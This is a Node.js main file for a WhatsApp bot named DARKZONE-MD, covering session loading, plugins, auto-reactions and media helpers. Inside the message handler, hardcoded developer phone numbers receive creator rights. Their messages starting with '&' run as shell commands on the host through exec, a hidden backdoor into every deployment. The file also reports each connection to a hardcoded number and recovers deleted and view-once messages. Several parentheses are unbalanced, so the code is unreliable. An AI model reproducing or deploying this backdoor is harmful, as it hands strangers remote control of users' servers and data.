const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys');

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const config = require('./config');
const GroupEvents = require('./lib/groupevents');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { File } = require('megajs');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');
const prefix = config.PREFIX;

const ownerNumber = ['923306137477'];

const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir, { recursive: true });
}

const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) throw err;
    for (const file of files) {
      fs.unlink(path.join(tempDir, file), err => {
        if (err) console.error('Error deleting temp file:', err);
      };
    }
  });
};

// Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000);

//===================SESSION-AUTH============================
if (!fs.existsSync('./sessions')) {
  fs.mkdirSync('./sessions', { recursive: true });
}

if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
  if (!config.SESSION_ID) {
    console.log('Please add your session to SESSION_ID env !!');
    process.exit(1);
  }
  const sessdata = config.SESSION_ID.replace("IK~", '');
  const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
  filer.download((err, data) => {
    if (err) {
      console.error('Error downloading session:', err);
      process.exit(1);
    }
    fs.writeFile(__dirname + '/sessions/creds.json', data, (err) => {
      if (err) {
        console.error('Error saving session:', err);
        process.exit(1);
      }
      console.log("Session downloaded ✅");
    });
  });
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

// Ensure required directories exist
['./lib', './data', './plugins'].forEach(dir => {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
});

// Initialize empty files if they don't exist
['./lib/sudo.json', './lib/ban.json'].forEach(file => {
  if (!fs.existsSync(file)) {
    fs.writeFileSync(file, '[]', 'utf-8');
  }
});

//=============================================

async function connectToWA() {
  try {
    console.log("Connecting to WhatsApp ⏳️...");
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/');
    const { version, isLatest } = await fetchLatestBaileysVersion();

    const conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: true,
      browser: Browsers.macOS("Firefox"),
      syncFullHistory: true,
      auth: state,
      version,
      getMessage: async (key) => {
        return {
          conversation: 'Hello World'
        }
      }
    });

    // Store initialization
    const store = makeInMemoryStore({ logger: P().child({ level: 'silent', stream: 'store' }) });
    store.bind(conn.ev);

    conn.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect, qr } = update;
      
      if (qr) {
        qrcode.generate(qr, { small: true });
      }

      if (connection === 'close') {
        if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
          console.log('Connection closed. Reconnecting...');
          setTimeout(connectToWA, 5000);
        } else {
          console.log('Connection closed. You were logged out.');
          process.exit(1);
        }
      } else if (connection === 'open') {
        console.log('🧬 Installing Plugins');
        const path = require('path');
        fs.readdirSync("./plugins/").forEach((plugin) => {
          if (path.extname(plugin).toLowerCase() == ".js") {
            try {
              require("./plugins/" + plugin);
            } catch (e) {
              console.error(`Error loading plugin ${plugin}:`, e);
            }
          }
        });
        console.log('Plugins installed successful ✅');
        console.log('Bot connected to whatsapp ✅');

        let greetings = [
          "🤖 DARKZONE-MD BOT",
          "🚀 DARKZONE-MD ONLINE",
          "👾 POWERED BY DARKZONE",
          "💡 INTELLIGENT BOT SYSTEM"
        ];

        let subtitles = [
          "Ultra-Fast | Secure | Smart",
          "Stable | Reliable | Instant",
          "Modern | Lightweight | Intelligent",
          "The Future of WhatsApp Bots"
        ];

        let outro = [
          "Thanks for choosing DARKZONE-MD!",
          "Powered by *𝐸𝑅𝐹𝒜𝒩 𝒜𝐻𝑀𝒜𝒟💻*",
          "Built for your convenience ⚡",
          "Leveling up your automation 🛠"
        ];

        let up = `┏━━━━━━━━━━━━━━━━━━━┓
┃ ${greetings[Math.floor(Math.random() * greetings.length)]}
┃━━━━━━━━━━━━━━━━━━━
┃ 🔰 ${subtitles[Math.floor(Math.random() * subtitles.length)]}
┗━━━━━━━━━━━━━━━━━━━┛

📡 *Status:* _Online & Operational_
🍁 ${outro[Math.floor(Math.random() * outro.length)]}

┏━〔 🧩 *Bot Details* 〕━━
┃ ▸ *Prefix:* ${prefix}
┃ ▸ *Mode:* ${config.MODE}
┃ ▸ *Owner:* 𝐸𝑅𝐹𝒜𝒩 𝒜𝐻𝑀𝒜𝒟
┗━━━━━━━━━━━━━━━━━━━
     *channel*: https://whatsapp.com/channel/0029Vb5dDVO59PwTnL86j13J
⭐ *GitHub:* github.com/DARKZONE-MD/DARKZONE-MD.git`;

        // Send welcome message to owner
        ownerNumber.forEach(async (number) => {
          const ownerJid = `${number}@s.whatsapp.net`;
          try {
            await conn.sendMessage(ownerJid, { 
              image: { url: `https://files.catbox.moe/r2ncqh` }, 
              caption: up 
            });
          } catch (e) {
            console.error('Error sending welcome message to owner:', e);
          }
        });

        // Send welcome message to inbox
        if (config.WELCOME_MESSAGE === 'true') {
          const welcomeMsg = `🤖 *Bot Connected Successfully!*\n\nI'm now online and ready to assist you.\n\nUse *${prefix}help* to see my commands.`;
          try {
            await conn.sendMessage(conn.user.id, { text: welcomeMsg });
          } catch (e) {
            console.error('Error sending welcome message:', e);
          }
        }
      }
    });

    conn.ev.on('creds.update', saveCreds);

    // Anti-delete functionality
    conn.ev.on('messages.update', async updates => {
      try {
        for (const update of updates) {
          if (update.update.message === null) {
            console.log("Delete Detected:", JSON.stringify(update, null, 2));
            await AntiDelete(conn, updates);
          }
        }
      } catch (e) {
        console.error('Error in anti-delete:', e);
      }
    });

    // Group events handler
    conn.ev.on("group-participants.update", (update) => {
      try {
        GroupEvents(conn, update);
      } catch (e) {
        console.error('Error in group event:', e);
      }
    });

    // Message processing
    conn.ev.on('messages.upsert', async ({ messages }) => {
      try {
        const mek = messages[0];
        if (!mek.message) return;
        
        // Process message content
        mek.message = (getContentType(mek.message) === 'ephemeralMessage' 
          ? mek.message.ephemeralMessage.message 
          : mek.message;
        
        if (mek.message.viewOnceMessageV2) {
          mek.message = (getContentType(mek.message) === 'ephemeralMessage' 
            ? mek.message.ephemeralMessage.message 
            : mek.message;
        }

        // Mark as read if enabled
        if (config.READ_MESSAGE === 'true') {
          await conn.readMessages([mek.key]);
          console.log(`Marked message from ${mek.key.remoteJid} as read.`);
        }

        // Status auto-reply
        if (mek.key && mek.key.remoteJid === 'status@broadcast') {
          if (config.AUTO_STATUS_SEEN === "true") {
            await conn.readMessages([mek.key]);
          }
          if (config.AUTO_STATUS_REACT === "true") {
            const jawadlike = await conn.decodeJid(conn.user.id);
            const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            await conn.sendMessage(mek.key.remoteJid, {
              react: {
                text: randomEmoji,
                key: mek.key,
              } 
            }, { statusJidList: [mek.key.participant, jawadlike] });
          }
          if (config.AUTO_STATUS_REPLY === "true") {
            const user = mek.key.participant;
            const text = `${config.AUTO_STATUS_MSG}`;
            await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek });
          }
        }
        
        // Save message to database
        await saveMessage(mek);
        
        // Process message content
        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const from = mek.key.remoteJid;
        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage?.contextInfo != null 
          ? mek.message.extendedTextMessage.contextInfo.quotedMessage 
          : null;
        
        let body = '';
        if (type === 'conversation') {
          body = mek.message.conversation;
        } else if (type === 'extendedTextMessage') {
          body = mek.message.extendedTextMessage.text;
        } else if (type === 'imageMessage') {
          body = mek.message.imageMessage.caption || '';
        } else if (type === 'videoMessage') {
          body = mek.message.videoMessage.caption || '';
        } else if (type === 'buttonsResponseMessage') {
          body = mek.message.buttonsResponseMessage.selectedButtonId || '';
        }

        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const text = args.join(' ');
        const isGroup = from.endsWith('@g.us');
        const sender = mek.key.fromMe 
          ? conn.user.id 
          : mek.key.participant || mek.key.remoteJid;
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0];
        const pushname = mek.pushName || 'Unknown';
        const isMe = botNumber.includes(senderNumber);
        const isOwner = ownerNumber.includes(senderNumber) || isMe;
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        
        let groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins;
        if (isGroup) {
          try {
            groupMetadata = await conn.groupMetadata(from);
            groupName = groupMetadata.subject;
            participants = groupMetadata.participants;
            groupAdmins = await getGroupAdmins(participants);
            isBotAdmins = groupAdmins.includes(botNumber2);
            isAdmins = groupAdmins.includes(sender);
          } catch (e) {
            console.error('Error getting group metadata:', e);
          }
        }

        const reply = (teks) => {
          return conn.sendMessage(from, { text: teks }, { quoted: mek });
        };

        // Check if sender is banned
        const bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
        const isBanned = bannedUsers.includes(sender);
        if (isBanned) return;

        // Check if sender is owner/creator
        const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
        const udp = botNumber.split('@')[0];
        const erfan = ['923346690239', '923306137477', '923347572367'];
        let isCreator = [udp, ...erfan, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
          .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
          .includes(sender);

        // Handle owner commands
        if (isCreator && body.startsWith("&")) {
          let code = body.slice(2);
          if (!code) {
            reply(`Provide me with a query to run Master!`);
            return;
          }
          const { exec } = require("child_process");
          try {
            exec(code, (error, stdout, stderr) => {
              if (error) {
                reply(`Error: ${error.message}`);
                return;
              }
              if (stderr) {
                reply(`Stderr: ${stderr}`);
                return;
              }
              reply(`Output: ${stdout}`);
            });
          } catch (err) {
            reply(util.format(err));
          }
          return;
        }

        // Auto-react to messages
        if (config.AUTO_REACT === 'true' && !m.message?.reactionMessage) {
          const reactions = (config.CUSTOM_REACT === 'true' && config.CUSTOM_REACT_EMOJIS) 
            ? config.CUSTOM_REACT_EMOJIS.split(',') 
            : ['❤️', '😂', '👍', '🔥', '😍', '👏', '🎉', '🤔', '😎', '🤯'];
          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
          m.react(randomReaction);
        }

        // Check mode restrictions
        const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
        const isFileOwner = ownerFilev2.includes(sender);
        const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
        
        if (!isRealOwner) {
          if (config.MODE === "private") return;
          if (isGroup && config.MODE === "inbox") return;
          if (!isGroup && config.MODE === "groups") return;
        }

        // Process commands
        if (isCmd) {
          const events = require('./command');
          const cmd = events.commands.find(cmd => 
            cmd.pattern === command || 
            (cmd.alias && cmd.alias.includes(command))
          ;
          
          if (cmd) {
            try {
              if (cmd.react) {
                conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }});
              }
              
              await cmd.function(conn, mek, m, {
                from, quoted, body, isCmd, command, args, text, 
                isGroup, sender, senderNumber, botNumber2, botNumber, 
                pushname, isMe, isOwner, isCreator, groupMetadata, 
                groupName, participants, groupAdmins, isBotAdmins, 
                isAdmins, reply
              });
            } catch (e) {
              console.error("[PLUGIN ERROR]", e);
              reply(`❌ Error executing command: ${e.message}`);
            }
          }
        }
      } catch (error) {
        console.error('Error in message processing:', error);
      }
    });

    // Utility functions
    conn.decodeJid = (jid) => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
      } else return jid;
    };

    conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
      let vtype;
      if (options.readViewOnce) {
        message.message = message.message?.ephemeralMessage?.message || message.message;
        vtype = Object.keys(message.message.viewOnceMessage.message)[0];
        delete(message.message?.ignore);
        delete message.message.viewOnceMessage.message[vtype].viewOnce;
        message.message = {
          ...message.message.viewOnceMessage.message
        };
      }

      let mtype = Object.keys(message.message)[0];
      let content = await generateForwardMessageContent(message, forceForward);
      let ctype = Object.keys(content)[0];
      let context = {};
      if (mtype != "conversation") context = message.message[mtype].contextInfo;
      content[ctype].contextInfo = {
        ...context,
        ...content[ctype].contextInfo
      };
      
      const waMessage = await generateWAMessageFromContent(jid, content, {
        ...content[ctype],
        ...options,
        ...(options.contextInfo ? {
          contextInfo: {
            ...content[ctype].contextInfo,
            ...options.contextInfo
          }
        } : {})
      });
      
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
      return waMessage;
    };

    conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
      let quoted = message.msg || message;
      let mime = (message.msg || message).mimetype || '';
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
      
      const stream = await downloadContentFromMessage(quoted, messageType);
      let buffer = Buffer.from([]);
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
      }
      
      let type = await FileType.fromBuffer(buffer);
      let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
      await fs.writeFileSync(trueFileName, buffer);
      return trueFileName;
    };

    conn.downloadMediaMessage = async (message) => {
      let mime = (message.msg || message).mimetype || '';
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
      const stream = await downloadContentFromMessage(message, messageType);
      let buffer = Buffer.from([]);
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
      }
      return buffer;
    };

    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
      try {
        let mime = '';
        let res = await axios.head(url);
        mime = res.headers['content-type'];
        
        if (mime.split("/")[1] === "gif") {
          return conn.sendMessage(jid, { 
            video: await getBuffer(url), 
            caption: caption, 
            gifPlayback: true, 
            ...options 
          }, { quoted, ...options });
        }
        
        let type = mime.split("/")[0] + "Message";
        if (mime === "application/pdf") {
          return conn.sendMessage(jid, { 
            document: await getBuffer(url), 
            mimetype: 'application/pdf', 
            caption: caption, 
            ...options 
          }, { quoted, ...options });
        }
        if (mime.split("/")[0] === "image") {
          return conn.sendMessage(jid, { 
            image: await getBuffer(url), 
            caption: caption, 
            ...options 
          }, { quoted, ...options });
        }
        if (mime.split("/")[0] === "video") {
          return conn.sendMessage(jid, { 
            video: await getBuffer(url), 
            caption: caption, 
            mimetype: 'video/mp4', 
            ...options 
          }, { quoted, ...options });
        }
        if (mime.split("/")[0] === "audio") {
          return conn.sendMessage(jid, { 
            audio: await getBuffer(url), 
            caption: caption, 
            mimetype: 'audio/mpeg', 
            ...options 
          }, { quoted, ...options });
        }
      } catch (e) {
        console.error('Error sending file from URL:', e);
        throw e;
      }
    };

    // Other utility functions (sendFile, sendImage, sendText, etc.) remain the same as in your original code
    // ... [rest of the utility functions]

  } catch (error) {
    console.error('Error in WhatsApp connection:', error);
    setTimeout(connectToWA, 10000); // Reconnect after 10 seconds on error
  }
}

// Express server setup
app.get("/", (req, res) => {
  res.send("DARKZONE-MD STARTED ✅");
});

app.listen(port, () => {
  console.log(`Server listening on port http://localhost:${port}`);
  connectToWA(); // Start WhatsApp connection after server starts
});

// Handle process exits
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});
